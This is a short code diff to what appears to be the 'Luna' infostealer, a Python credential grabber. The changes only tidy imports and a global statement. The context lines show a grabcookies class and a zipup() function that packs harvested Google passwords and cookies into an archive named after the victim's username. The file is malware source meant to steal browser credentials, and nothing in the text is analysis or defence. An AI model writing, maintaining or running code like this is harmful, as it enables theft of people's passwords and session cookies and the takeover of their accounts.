@@ -1,5 +1,4 @@
 import os
-import difflib
 import platform
 from tempfile import mkdtemp
 import threading
@@ -9,8 +8,6 @@ import wmi
 import subprocess
 import sqlite3
 import psutil
-import ntpath
-import shutil
 import json
 
 from json import loads
@@ -548,7 +545,6 @@ class grabcookies():
             f.write("\n".join(used_login_dbs))
 
 def zipup():
-    global zipf
     with ZipFile(f'Luna-Logged-{os.getenv("Username")}.zip', 'w') as zipf:
         zipf.write("google-passwords.txt")
         zipf.write("google-cookies.txt")
